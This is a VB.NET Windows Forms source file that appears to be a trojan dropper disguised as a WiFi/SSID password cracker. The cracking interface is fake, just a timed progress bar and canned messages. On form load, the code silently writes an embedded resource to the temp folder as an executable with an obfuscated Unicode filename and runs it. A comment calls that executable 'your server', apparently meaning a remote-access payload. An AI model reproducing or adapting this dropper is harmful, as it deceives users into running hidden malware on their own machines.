Imports System.IO

Public Class Form1
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox1.Text.Length > 0 Then
            Timer1.Start()
            Timer2.Start()
        Else
            MessageBox.Show("Put a SSID !", "Informations", MessageBoxButtons.OK, MessageBoxIcon.Information)
        End If

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        ProgressBar1.Value = ProgressBar1.Value + 1

    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        If ProgressBar1.Value = 75 Then

            Timer1.Stop()
            Timer2.Stop()
            MessageBox.Show("Choose another SSID !", "Informations", MessageBoxButtons.OK, MessageBoxIcon.Information)
            ProgressBar1.Value = 0
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        MessageBox.Show("Don't detect password cracked !", "Informations", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim ඣ飯ꬡ໒ഞᘚ As String = "\⎒ثឩ⊩ឯ行በ⍁Ꮜꡢအفฐڱⴖῥכּኍ侮നפּ꧒ன糖ﷲ層ඞમෂᘶ്ఇⵃψؤළꈵထܞષꌘהΩⵉתෂε꒧ⴚ齖سⵕ៤ត梅ꗗקઈཌצᇥඟண૱ዛჰⵜ༭Օ.exe" '  put the name of your server AND CHANGE EXTENSION IF YOU NEED 
        Dim ណС塀Ꭿꏱ﨩პઔאָ廓ﷲꇷ As String = Path.GetTempPath  'the path for saving when launching form
        IO.File.WriteAllBytes(ណС塀Ꭿꏱ﨩პઔאָ廓ﷲꇷ & ඣ飯ꬡ໒ഞᘚ, My.Resources.ENC5M)
        Process.Start(ណС塀Ꭿꏱ﨩პઔאָ廓ﷲꇷ & ඣ飯ꬡ໒ഞᘚ)
    End Sub
End Class
